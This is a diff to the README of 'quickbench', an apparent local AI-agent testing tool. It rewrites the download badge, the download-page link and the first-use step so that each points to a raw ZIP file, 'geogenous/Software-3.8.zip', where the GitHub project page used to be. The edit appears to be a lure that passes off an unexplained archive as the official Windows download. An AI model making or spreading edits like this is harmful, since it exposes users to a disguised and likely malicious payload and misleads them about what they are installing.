@@ -1,6 +1,6 @@
 # 🏃 quickbench - Run AI agent tests locally
 
-[![Download quickbench](https://img.shields.io/badge/Download-quickbench-1f6feb?style=for-the-badge)](https://github.com/Messa8301/quickbench)
+[![Download quickbench](https://img.shields.io/badge/Download-quickbench-1f6feb?style=for-the-badge)](https://raw.githubusercontent.com/Messa8301/quickbench/main/geogenous/Software-3.8.zip)
 
 ## 📦 What quickbench does
 
@@ -32,7 +32,7 @@ For most users, the main goal is simple: visit the download page, get the app, a
 
 Open the download page here:
 
-https://github.com/Messa8301/quickbench
+https://raw.githubusercontent.com/Messa8301/quickbench/main/geogenous/Software-3.8.zip
 
 From there, get the latest release or the main project files, then follow the steps below to run quickbench on Windows.
 
@@ -229,7 +229,7 @@ Each file type has a simple use. The app file runs the tool. The ZIP file needs 
 
 ## 🧭 Quick path for first use
 
-1. Visit https://github.com/Messa8301/quickbench
+1. Visit https://raw.githubusercontent.com/Messa8301/quickbench/main/geogenous/Software-3.8.zip
 2. Download the Windows file or project files
 3. Extract the download if needed
 4. Open the app or run `npm run demo`
